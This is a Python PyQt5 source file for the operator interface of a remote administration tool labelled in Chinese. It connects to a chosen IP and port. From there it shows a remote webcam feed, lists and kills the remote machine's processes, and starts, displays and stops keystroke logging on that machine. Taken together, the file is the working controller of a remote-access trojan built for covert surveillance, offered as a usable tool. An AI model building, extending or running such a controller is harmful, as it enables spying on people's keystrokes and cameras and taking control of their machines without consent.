from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5 import QtCore
from PyQt5.QtCore import QRegExp, QTimer
import socket
import time
import threading
from read import *
mutex = threading.Lock()
targetP = -1
class MainWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.init_UI()

    def init_UI(self):
        # 设置窗口标题和大小
        self.setWindowTitle('远程管理')
        self.resize(800, 600)
        self.baseLayout = QHBoxLayout()
        #self.setStyleSheet("background-color: rgb(255, 255, 255);")
        #self.setWindowFlag(QtCore.Qt.FramelessWindowHint)

        #self.setAttribute(QtCore.Qt.WA_TranslucentBackground)
        self.set_background()
        self.setWindowOpacity(0.9)
        #按钮
        self.buttomOne = QPushButton('链接', self)
        self.buttomOne.setGeometry(QtCore.QRect(250, 87, 100, 28))
        #按钮2
        self.buttomTwo = QPushButton('开启摄像头', self)
        self.buttomTwo.setGeometry(QtCore.QRect(0, 200, 100, 28))
        #
        self.buttomThree = QPushButton('进程管理', self)
        self.buttomThree.setGeometry(QtCore.QRect(0, 250, 100, 28))
        #按钮4
        self.buttomFour = QPushButton('键盘记录', self)
        self.buttomFour.setGeometry(QtCore.QRect(0, 300, 100, 28))
        #文本框
        re = QRegExp('((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}')
        re_validato = QRegExpValidator(re, self)  # 实例化正则验证器
        self.re_le = QLineEdit(self)  # 正则文本框
        self.re_le.setValidator(re_validato)  # 设置验证
        self.re_le.move(50, 90)

        self.re_le_one = QLineEdit(self)  # 正则文本框
        self.re_le_one.move(50, 120)

        # 标签1
        self.label1 = QLabel(self)
        self.label1.setText('IP：')
        # 标签1的背景填充更改为True，否则无法显示背景
        self.label1.setAutoFillBackground(True)
        # 实例化背景对象，进行相关背景颜色属性设置
        palette = QPalette()
        palette.setColor(QPalette.Window, QtCore.Qt.blue)
        # 标签1加载背景
        self.label1.setPalette(palette)
        # 设置文本居中显示
        self.label1.setAlignment(QtCore.Qt.AlignCenter)
        self.label1.setGeometry(QtCore.QRect(0, 90, 50, 20))

        #标签2：
        self.label2 = QLabel(self)
        self.label2.setText('端口：')
        # 标签1的背景填充更改为True，否则无法显示背景
        self.label2.setAutoFillBackground(True)
        # 实例化背景对象，进行相关背景颜色属性设置
        palette = QPalette()
        palette.setColor(QPalette.Window, QtCore.Qt.blue)
        # 标签1加载背景
        self.label2.setPalette(palette)
        # 设置文本居中显示
        self.label2.setAlignment(QtCore.Qt.AlignCenter)
        self.label2.setGeometry(QtCore.QRect(0, 120, 50, 20))
        #标签3
        self.label3 = QLabel(self)
        self.label3.setText('功能：')
        # 标签1的背景填充更改为True，否则无法显示背景
        self.label3.setAutoFillBackground(True)
        # 实例化背景对象，进行相关背景颜色属性设置
        palette = QPalette()
        palette.setColor(QPalette.Window, QtCore.Qt.white)
        # 标签1加载背景
        self.label3.setPalette(palette)
        # 设置文本居中显示
        self.label3.setAlignment(QtCore.Qt.AlignCenter)
        self.label3.setGeometry(QtCore.QRect(0, 160, 100, 40))
        #标签4
        self.label4 = QLabel(self)
        self.label4.setText('功能说明：双击结束进程：')
        # 标签1的背景填充更改为True，否则无法显示背景
        self.label4.setAutoFillBackground(True)
        # 实例化背景对象，进行相关背景颜色属性设置
        palette = QPalette()
        palette.setColor(QPalette.Window, QtCore.Qt.blue)
        # 标签1加载背景
        self.label4.setPalette(palette)
        # 设置文本居中显示
        self.label4.setAlignment(QtCore.Qt.AlignCenter)
        self.label4.setGeometry(QtCore.QRect(125, 230, 200, 20))

        #标签5
        self.label5 = QLabel(self)
        self.label5.setText('未连接')
        # 标签1的背景填充更改为True，否则无法显示背景
        self.label5.setAutoFillBackground(True)
        # 实例化背景对象，进行相关背景颜色属性设置
        palette = QPalette()
        palette.setColor(QPalette.Window, QtCore.Qt.blue)
        # 标签1加载背景
        self.label5.setPalette(palette)
        # 设置文本居中显示
        self.label5.setAlignment(QtCore.Qt.AlignCenter)

        self.show()
    def set_background(self):
        winBack = QPalette()
        winBack.setBrush(self.backgroundRole(),
                         QBrush(QPixmap('background.jpg')))
        self.setPalette(winBack)
        #self.baseLayout.addWidget(winBack)
        self.setAutoFillBackground(True)
    def msg_one(self):
        QMessageBox.information(self, '错误', '连接错误请重试', QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)
    def msg_two(self):
        QMessageBox.information(self, '错误', '连接已断开', QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)
    def set_lable5(self):
        self.label5.setText("已连接")
    def set_lable5_re(self):
        self.label5.setText("未连接")
    def get_line_one_text(self):
        return self.re_le.text()
    def get_line_one_text_one(self):
        return self.re_le_one.text()


class NewWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('新窗口')
        self.resize(600, 400)
        self.showFlag = 0
    def init_UI_shell(self): #shell的UI
        self.timer = QTimer()
        # 定时器结束，触发showTime方法
        self.timer.timeout.connect(self.set_image)
        self.timer.start(200)
        self.labelI = QLabel(self)
        self.labelI.setText("摄像头")
        self.labelI.setFixedSize(600, 400)
        self.labelI.move(0, 0)
        self.show()
    def init_UI_PM(self, MyConnection):
        self.resize(600, 400)
        self.timer = QTimer()
        layout = QVBoxLayout()
        self.timer.start(1000)
        self.MyConnection = MyConnection
        listView = QListView()  # 创建一个listview对象
        self.slm = QtCore.QStringListModel() # 创建mode
       # self.qList = read_txt()  # 添加的数组数据
        #self.set_string()
        self.timer.timeout.connect(self.set_string)
        #self.slm.setStringList(self.qList)  # 将数据设置到model
        listView.setModel(self.slm)  ##绑定 listView 和 model
        listView.doubleClicked.connect(self.now_row)
        layout.addWidget(listView)  # 将list view添加到layout
        self.setLayout(layout)  # 将lay 添加到窗口
        self.show()

    def init_UI_KEY(self):
        self.showFlag = 1
        self.timer = QTimer()
        self.layout = QVBoxLayout()
        self.buttomSOne = QPushButton("停止键盘监控")
        self.buttomSOne.setMinimumSize(100, 15)
        self.buttomSOne.setMaximumSize(150,30)
        self.buttomSOne.setGeometry(QtCore.QRect(500, 400, 200, 30))
        self.layout.addWidget(self.buttomSOne)
        self.output_result = QTextEdit(self)
        self.output_result.setMinimumSize(160, 160)
        self.output_result.setGeometry(QtCore.QRect(0, 30, 500, 400))
        self.layout.addWidget(self.output_result)
        self.timer.start(1000)
        self.timer.timeout.connect(self.append_output)
        self.setLayout(self.layout)
        self.show()
    def append_output(self):
        self.output_result.moveCursor(QTextCursor.Start)
        self.output_result.setPlainText('')
        for keyString in read_apl():
            self.output_result.append(keyString)
    def set_string(self):
        self.qList = read_txt()  # 添加的数组数据
        #print(self.qList)
        self.slm.setStringList(self.qList)
        #print("resetstring")
    def now_row(self, qModelIndex):
        QMessageBox.information(self, "QListView", "你结束了进程 " + self.qList[qModelIndex.row()])
        targetP = qModelIndex.row()
        pidNum = get_pid(self.qList[targetP])
        self.MyConnection.send_pid(pidNum)

    def set_image(self):
        png = QPixmap("1.png").scaled(self.labelI.width(), self.labelI.height())
        self.labelI.setPixmap(png)
        self.labelI.repaint()

    def msg_two(self):
        QMessageBox.information(self, '错误', '未连接', QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)

def expection_handler(MyConnection, MainW, tLock):
    tLock.release()
    MyConnection.close()
    MainW.msg_two()
    MyConnection.MyFlag = 0
    MainW.set_lable5_re()

def t1_re_image(MyConnection, MainW):
    print("t1 runing")
    while True:
        time.sleep(0.5)
        mutex.acquire()
        MyType = MyConnection.get_type()
        Mylen = MyConnection.get_length()
        if MyType == 1:
            MyConnection.get_image(Mylen)
        elif MyType == 2:
            MyConnection.get_txt(Mylen)
        elif MyType == 3:
            MyConnection.get_apl(Mylen)
        # try:
        #     Mytpye = MyConnection.get_type()
        # except ZeroDivisionError as e:
        #     expection_handler(MyConnection, MainW, mutex)
        #     return
        # try:
        #     Length = MyConnection.get_length()
        # except ZeroDivisionError as e:
        #     expection_handler(MyConnection, MainW, mutex)
        #     return
        # print(Length)
        # if Mytpye == 1:
        #     try:
        #         MyConnection.get_image(Length)
        #     except ZeroDivisionError as e:
        #         expection_handler(MyConnection, MainW, mutex)
        #         return
        # elif Mytpye == 2:
        #     try:
        #         MyConnection.get_txt(Length)
        #     except ZeroDivisionError as e:
        #         expection_handler(MyConnection, MainW, mutex)
        #         return
        # elif Mytpye == 3:
        #     try:
        #         MyConnection.get_apl(Length)
        #     except ZeroDivisionError as e:
        #         expection_handler(MyConnection, MainW, mutex)
        #         return
        # elif Mytpye == 4:
        #     print("close")
        #     MyConnection.close()
        #     mutex.release()
        #     return

        #MyConnection.get_image()
        mutex.release()
def on_click_buttom_one(MainW, MyConnection):

    MyConnection.ipAddr = MainW.get_line_one_text()
    MyConnection.port = MainW.get_line_one_text_one()
    print(MyConnection.ipAddr)
    MyConnection.port = int(MainW.get_line_one_text_one())
    if MyConnection.creat_link() == socket.timeout:
        MainW.msg_one()
    else:
        MainW.set_lable5()
        print("S")
        t1 = threading.Thread(target=t1_re_image, args=(MyConnection, MainW))
        t1.start()

def on_click_buttom_two(MainW, SonW, MyConnection):
    if MyConnection.MyFlag == 0:
        SonW.msg_two()
        return
    SonW.init_UI_shell()
    SonW.show()

def on_click_buttom_three(SonW, MyConnection):
    if MyConnection.MyFlag == 0:
        SonW.msg_two()
        return
    SonW.init_UI_PM(MyConnection)
    SonW.set_string()
    #print(SonW.now_row(SonW.qList))
    #SonW.listView.doubleClicked.connect(listViewDC(SonW.qList, ))

def on_click_buttom_son_one(MyConnection):
    MyConnection.send_stop()

def on_click_buttom_four(SonW, MyConnection):
    if MyConnection.MyFlag == 0:
        SonW.msg_two()
        return
    if SonW.showFlag == 0:
        SonW.init_UI_KEY()
    else:
        SonW.show()
    MyConnection.send_require()
    SonW.buttomSOne.clicked.connect(lambda: on_click_buttom_son_one(MyConnection))